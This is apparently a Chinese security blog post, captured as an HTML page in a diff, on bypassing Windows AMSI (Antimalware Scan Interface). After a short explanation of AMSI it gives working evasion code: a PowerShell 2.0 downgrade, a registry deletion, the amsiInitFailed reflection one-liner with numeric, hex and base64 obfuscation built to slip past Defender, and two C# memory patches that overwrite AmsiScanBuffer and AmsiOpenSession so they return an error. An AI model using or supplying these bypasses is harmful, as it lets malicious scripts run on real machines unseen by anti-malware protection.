@@ -1,0 +1,621 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>bypass-AMSI - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="bypass-AMSI">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-26 11:09" pubdate>
+        2022年3月26日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">bypass-AMSI</h1>
+            
+            <div class="markdown-body">
+              <h2 id="何为AMSI"><a href="#何为AMSI" class="headerlink" title="何为AMSI"></a>何为AMSI</h2><p>Antimalware Scan Interface(AMSI)为反恶意软件扫描接口。</p>
+<p>微软对他产生的目的做出来描述：</p>
+<blockquote>
+<p>Windows 反恶意软件扫描接口 (AMSI) 是一种通用接口标准，允许您的应用程序和服务与机器上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强的恶意软件保护。AMSI 与反恶意软件供应商无关；它旨在支持当今可以集成到应用程序中的反恶意软件产品提供的最常见的恶意软件扫描和保护技术。它支持允许文件和内存或流扫描、内容源 URL/IP 信誉检查和其他技术的调用结构。AMSI 还支持会话的概念，以便反恶意软件供应商可以关联不同的扫描请求。例如，可以将恶意负载的不同片段关联起来做出更明智的决定，而仅通过孤立地查看这些片段就很难做出决定。</p>
+</blockquote>
+<p>amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理还是远程执行，amsi都可以在脚本注入内存前检测到。而普通的静态杀毒软件是没办法的。</p>
+<p>当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。<br>  AmsiScanBuffer()<br>  AmsiScanString()</p>
+<p>amsi是所有杀毒软件都可以调用吗？并不是！<br>amsi是在Windows 10 和Windows Server 2016 之后才有的，然后并不是所有的杀毒软件都可以调用amsi接口。国内的基本都不可以。</p>
+<p>github上有一个项目记录了可以调用amsi的杀毒软件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/subat0mik/whoamsi/">https://github.com/subat0mik/whoamsi/</a></p>
+<p>在Windows Server 2016和Win10上已经默认安装并启用。他的本体是一个DLL文件，存在于 c:/windows/system32/amsi.dll。<img src="/2022/03/26/bypass-AMSI/image-20220326111424418.png" srcset="/img/loading.gif" lazyload alt="image-20220326111424418"></p>
+<p>目前AMSI功能已集成到Windows 10的这些组件中</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户账户控制，也就是UAC（EXE、COM、MSI、ActiveX的安装） <br>	%windir%<span class="hljs-regexp">/System32/</span>consent.exe<br><span class="hljs-number">2.</span>Powershell（脚本、交互式使用、动态代码求值）<br>	System.Management.Automation.dll<br><span class="hljs-number">3.</span>Windows脚本宿主<br>    wscript.exe<br>    cscript.exe<br><span class="hljs-number">4.</span>JavaScript、VBScript<br>    %windir%<span class="hljs-regexp">/System32/</span>jscript.dll<br>    %windir%<span class="hljs-regexp">/System32/</span>vbscript.dll<br><span class="hljs-number">5.</span>Office VBA macros(宏)<br>	VBE7.dll<br><span class="hljs-number">6</span> .NET Assembly<br>	clr.dll<br><span class="hljs-number">7.</span>WMI<br>	%windir%<span class="hljs-regexp">/System32/</span>wbem/fastprox.dll<br></code></pre></td></tr></table></figure>
+
+<h2 id="主流对抗"><a href="#主流对抗" class="headerlink" title="主流对抗"></a>主流对抗</h2><h3 id="1-降级攻击"><a href="#1-降级攻击" class="headerlink" title="1.降级攻击"></a>1.降级攻击</h3><p>因为低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p>
+<p>下图是powershell在各个系统上的预装情况，可以看到现在常见的win10、Windows 2016、2019很少预装有powershell2.0（amsi是从win10、2016开始存在的），但是由于很多服务需要低版本的powershell，所以在红蓝对抗中也会碰到装有powershell2.0 的机器。</p>
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326111703209.png" srcset="/img/loading.gif" lazyload alt="image-20220326111703209"></p>
+<p>查看当前powershell版本</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$PSVersionTable</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326111803335.png" srcset="/img/loading.gif" lazyload alt="image-20220326111803335"></p>
+<p>判断能否使用powershell 2.0</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">注：非管理员权限<br><span class="hljs-keyword">Get</span>-ChildItem <span class="hljs-string">&#x27;HKLM:/SOFTWARE/Microsoft/NET Framework Setup/NDP&#x27;</span> -recurse | <span class="hljs-keyword">Get</span>-ItemProperty -<span class="hljs-type">name</span> <span class="hljs-keyword">Version</span> -EA <span class="hljs-number">0</span> | <span class="hljs-keyword">Where</span> &#123; $_.PSChildName -match <span class="hljs-string">&#x27;^(?!S)/p&#123;L&#125;&#x27;</span>&#125; | <span class="hljs-keyword">Select</span> -ExpandProperty <span class="hljs-keyword">Version</span><br><br>注：需要管理员权限<br>Win10：<br><span class="hljs-keyword">Get</span>-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2<br><br>Win2016/Win2019<br><span class="hljs-keyword">Get</span>-WindowsFeature PowerShell-V2<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326111916948.png" srcset="/img/loading.gif" lazyload alt="image-20220326111916948"></p>
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326111952986.png" srcset="/img/loading.gif" lazyload alt="image-20220326111952986"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">powershell.exe -version <span class="hljs-number">2</span>   <span class="hljs-regexp">//</span>改变powershell运行版本<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326112155816.png" srcset="/img/loading.gif" lazyload alt="image-20220326112155816"></p>
+<p>如果在脚本中使用，在脚本开头加入 <code>#requires -version 2</code>，这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版本执行。当然并不是所有脚本都可以在低版本的powershell执行。</p>
+<p>还有一点，用powershell3 /4/5都还是默认以当前版本的powershell来执行</p>
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326112254528.png" srcset="/img/loading.gif" lazyload alt="image-20220326112254528"></p>
+<p>另外vbscript/jscript不存在所谓降级攻击，因为在10/16/19并不存在像powershell一样的断代<br>情况</p>
+<h3 id="2-拆分"><a href="#2-拆分" class="headerlink" title="2.拆分"></a>2.拆分</h3><p><img src="/2022/03/26/bypass-AMSI/image-20220326112525445.png" srcset="/img/loading.gif" lazyload alt="image-20220326112525445"></p>
+<h3 id="3-改注册表禁用AMSI"><a href="#3-改注册表禁用AMSI" class="headerlink" title="3.改注册表禁用AMSI"></a>3.改注册表禁用AMSI</h3><p>设置注册表<code>HKCU/Software/Microsoft/Windows Script/Settings/AmsiEnable</code>设置为 0，以禁用<br>AMSI。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Remove-Item -Path <span class="hljs-string">&quot;HKLM:/Software/Microsoft/Windows Script/Settings/AmsiEnable&quot;</span> -Recurse<br></code></pre></td></tr></table></figure>
+
+<p>但是，改注册表并不是一种隐秘的方法，并且还需要管理员权限   不怎么适用了</p>
+<h3 id="4-一键关闭AMSI"><a href="#4-一键关闭AMSI" class="headerlink" title="4.一键关闭AMSI"></a>4.一键关闭AMSI</h3><p>使用一行命令关闭amsi，但直接使用肯定是不行的 会被拦</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Ref]</span><span class="hljs-selector-class">.Assembly</span><span class="hljs-selector-class">.GetType</span>(<span class="hljs-string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)<span class="hljs-selector-class">.GetField</span>(<span class="hljs-string">&#x27;amsiInitFailed&#x27;</span>,<span class="hljs-string">&#x27;NonPubilc,Static&#x27;</span>)<span class="hljs-selector-class">.SetValue</span>(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326112749046.png" srcset="/img/loading.gif" lazyload alt="image-20220326112749046"></p>
+<p>可以一个个试 到底是哪里被杀了</p>
+<p>经过测试发现 <code>AmsiUtils</code>和<code>AmsiInitFailed</code>被杀了</p>
+<p>接下来的思路就很明确了，就是针对<code>AmsiUtils</code>和<code>AmsiInitFailed</code>这两个字符串进行处理了</p>
+<p>和混淆shellcode的方法差不多，先编码再解码</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据</span><br>$a=<span class="hljs-string">&quot;5492868772801748688168747280728187173688878280688776828&quot;</span><br>$b=<span class="hljs-string">&quot;1173680867656877679866880867644817687416876797271&quot;</span><br><br><span class="hljs-comment">//对System.Management.Automation.AmsiUtils进行解码</span><br>$c=[<span class="hljs-keyword">string</span>](<span class="hljs-number">0.</span><span class="hljs-number">.37</span>|%&#123;[char][<span class="hljs-keyword">int</span>](<span class="hljs-number">29</span>+($a+$b).<span class="hljs-keyword">substring</span>(($_*<span class="hljs-number">2</span>),<span class="hljs-number">2</span>))&#125;)-replace <span class="hljs-string">&quot; &quot;</span><br>$d=[Ref].Assembly.GetType($c)<br><br><span class="hljs-comment">//对amsiInitFailed进行解码</span><br>$e=[<span class="hljs-keyword">string</span>](<span class="hljs-number">38.</span><span class="hljs-number">.51</span>|%&#123;[char][<span class="hljs-keyword">int</span>](<span class="hljs-number">29</span>+($a+$b).<span class="hljs-keyword">substring</span>(($_*<span class="hljs-number">2</span>),<span class="hljs-number">2</span>))&#125;)-replace <span class="hljs-string">&quot; &quot;</span><br>$f=$d.GetField($e,<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>)<br><br><span class="hljs-comment">//组合起来执行</span><br>$f.SetValue($null,$true)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/26/bypass-AMSI/image-20220326113041308.png" srcset="/img/loading.gif" lazyload alt="image-20220326113041308"></p>
+<p>混淆的关键点就是 编码解码 <code>[string](0..37|%&#123;[char][int](29+($a+$b).substring(($_*2),2))&#125;)-replace &quot; &quot;</code></p>
+<p>hex编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">[Ref].Assembly.GetType(<span class="hljs-string">&#x27;System.Management.Automation.&#x27;</span>+$(<span class="hljs-string">&quot;41 6D 73 69 55 74 69 6C 73&quot;</span>.Split(<span class="hljs-string">&quot; &quot;</span>)|<span class="hljs-keyword">forEach</span>&#123;[char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))&#125;|<span class="hljs-keyword">forEach</span>&#123;<span class="hljs-variable">$result</span>=<span class="hljs-variable">$result</span>+<span class="hljs-variable">$_</span>&#125;;<span class="hljs-variable">$result</span>)).GetField($(<span class="hljs-string">&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;</span>.Split(<span class="hljs-string">&quot; &quot;</span>)|<span class="hljs-keyword">forEach</span>&#123;[char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))&#125;|<span class="hljs-keyword">forEach</span>&#123;<span class="hljs-variable">$result2</span>=<span class="hljs-variable">$result2</span>+<span class="hljs-variable">$_</span>&#125;;<span class="hljs-variable">$result2</span>),<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure>
+
+<p> base64亲测失效，虽然可以关掉amsi，但被defender查杀，会立刻结束掉当前powershell进程</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Ref]</span><span class="hljs-selector-class">.Assembly</span><span class="hljs-selector-class">.GetType</span>(<span class="hljs-string">&#x27;System.Management.Automation.&#x27;</span>+$(<span class="hljs-selector-attr">[Text.Encoding]</span>::Unicode<span class="hljs-selector-class">.GetString</span>(<span class="hljs-selector-attr">[Convert]</span>::FromBase64String(<span class="hljs-string">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>))))<span class="hljs-selector-class">.GetField</span>($(<span class="hljs-selector-attr">[Text.Encoding]</span>::Unicode<span class="hljs-selector-class">.GetString</span>(<span class="hljs-selector-attr">[Convert]</span>::FromBase64String(<span class="hljs-string">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>)<span class="hljs-selector-class">.SetValue</span>(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure>
+
+<p>更多的混淆办法去学习下powershell，了解语言本身</p>
+<p>可参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Sg0LK8emSWP1m-yds4VGrQ">https://mp.weixin.qq.com/s/Sg0LK8emSWP1m-yds4VGrQ</a></p>
+<h3 id="5-内存补丁"><a href="#5-内存补丁" class="headerlink" title="5.内存补丁"></a>5.内存补丁</h3><p>AMSI检测相关api的调用顺序</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">AmsiInitialize – 初始化AMSI API.<br>AmsiOpenSession – 打开<span class="hljs-keyword">session</span><br>AmsiScanBuffer – scans the <span class="hljs-keyword">user</span>-<span class="hljs-keyword">input</span>.<br>AmsiCloseSession – 关闭<span class="hljs-keyword">session</span><br>AmsiUninitialize – 删除AMSI API<br></code></pre></td></tr></table></figure>
+
+<p>因为amsi是基于字符串静态扫描的，用到的函数是 <code>AmsiScanBuffer</code>，我们是不是可以hook该函数，使其返回我们需要的值呢？理则是修改AmsiScanBuffer函数的参数值（两个思路，一个是修改扫描长度，另一个是修改返回值）</p>
+<p>看下<code>AmsiScanBuffer</code>的函数参数</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">HRESULT AmsiScanBuffer( <br>HAMSICONTEXT amsiContext,<br> PVOID buffer,<br> ULONG <span class="hljs-built_in">length</span>,<br> LPCWSTR contentName,<br> HAMSISESSION amsiSession,<br> AMSI_RESULT *<span class="hljs-literal">result</span> );<br></code></pre></td></tr></table></figure>
+
+<p>为了让amsi.dll 返回 <code>AMSI_RESULT_NOT_DETECTED</code>，这里的关注点是 <code>hResult</code>，即amsi.dll的返回值，只要它小于0，就可以bypass amsi。通过分析我们可以在<code>AmsiInitialize、AmsiOpenSession、AmsiScanBuffer</code>这3个函数中patch(补丁)都可以达到bypass amsi的效果.</p>
+<p>分析后，<code>AmsiInitializ</code>不可以利用，<code>AmsiOpenSession、AmsiScanBuffer</code>可以利用</p>
+<p>demo1</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-variable">$p</span>=@&quot;<br>using System;<br>using System.Linq;<br>using System.Runtime.InteropServices;<br>public <span class="hljs-keyword">class</span> <span class="hljs-keyword">Program</span><br>&#123;<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr LoadLibrary(string name);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,<br>uint flNewProtect, <span class="hljs-keyword">out</span> uint lpfloldProtect);<br>public static void Bypass()<br>&#123;<br>String a =<br><span class="hljs-string">&quot;isma&quot;</span>;<br>String b =<br><span class="hljs-string">&quot;reffuBnacSismA&quot;</span>;<br>IntPtr lib = LoadLibrary(String.Join(<span class="hljs-string">&quot;&quot;</span><br>, a.<span class="hljs-built_in">Reverse</span>().ToArray()) +<br>&quot;<br>.dll&quot;);<br>IntPtr addr = GetProcAddress(lib, String.Join(<span class="hljs-string">&quot;&quot;</span><br>,<br>b.<span class="hljs-built_in">Reverse</span>().ToArray()));<br>uint old = 0;<br>byte[] p;<br>p = new byte[6];<br>p[0] = 0xB8;<br>p[1] = 0x57;<br>p[2] = 0x00;<br>p[3] = 0x07;<br>p[4] = 0x80;<br>p[5] = 0xc3;<br>VirtualProtect(addr, (UIntPtr)p.Length, 0x04, <span class="hljs-keyword">out</span> old);<br>Marshal.<span class="hljs-keyword">Copy</span>(p, 0, addr, p.Length);<br>VirtualProtect(addr, (UIntPtr)p.Length, old, <span class="hljs-keyword">out</span> old);<br>&#125;<br>&#125;<br>&quot;@<br>Add-<span class="hljs-keyword">Type</span> <span class="hljs-variable">$p</span><br>[<span class="hljs-keyword">Program</span>]::Bypass()<br></code></pre></td></tr></table></figure>
+
+<p>这段码的功能就是在<code>AmsiScanBuffer</code>的函数地址处直接打补丁，补丁汇编是：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x80070057</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure>
+
+<p><code>0x80070057</code>也就是<code>-2147024809</code>，是一个负数，当然也可以是其他负数，而<code>AmsiScanBuffer</code>也可以修<br>改成<code>AmsiOpenSession</code>。怎么把汇编代码转换成代码中的数组呢？使用<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%88%E5%BF%AB%E8%BD%AC%E6%8D%A2%E3%80%82%E6%88%91%E4%BB%AC%E6%9D%A5%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%E4%B8%8B%EF%BC%9A">https://defuse.ca/online-x86-assembler.htm#disassembly，可以很快转换。我们来修改代码测试下：</a></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-variable">$p</span>=@&quot;<br>using System;<br>using System.Linq;<br>using System.Runtime.InteropServices;<br>public <span class="hljs-keyword">class</span> <span class="hljs-keyword">Program</span><br>&#123;<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr LoadLibrary(string name);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,<br>uint flNewProtect, <span class="hljs-keyword">out</span> uint lpfloldProtect);<br>public static void Bypass()<br>&#123;<br>String a =<br><span class="hljs-string">&quot;isma&quot;</span>;<br>IntPtr lib = LoadLibrary(String.Join(<span class="hljs-string">&quot;&quot;</span><br>, a.<span class="hljs-built_in">Reverse</span>().ToArray()) +<br>&quot;<br>.dll&quot;);<br>IntPtr addr = GetProcAddress(lib,<br><span class="hljs-string">&quot;AmsiOpenSession&quot;</span>);<br>uint old = 0;<br>byte[] p;<br>p = new byte[6];<br>p[0] = 0xB8;<br>p[1] = 0xFF;<br>p[2] = 0xFF;<br>p[3] = 0xFF;<br>p[4] = 0xFF;<br>p[5] = 0xC3;<br>VirtualProtect(addr, (UIntPtr)p.Length, 0x04, <span class="hljs-keyword">out</span> old);<br>Marshal.<span class="hljs-keyword">Copy</span>(p, 0, addr, p.Length);<br>VirtualProtect(addr, (UIntPtr)p.Length, old, <span class="hljs-keyword">out</span> old);<br>	&#125;<br>&#125;<br>&quot;@<br>Add-<span class="hljs-keyword">Type</span> <span class="hljs-variable">$p</span><br>[<span class="hljs-keyword">Program</span>]::Bypass()<br></code></pre></td></tr></table></figure>
+
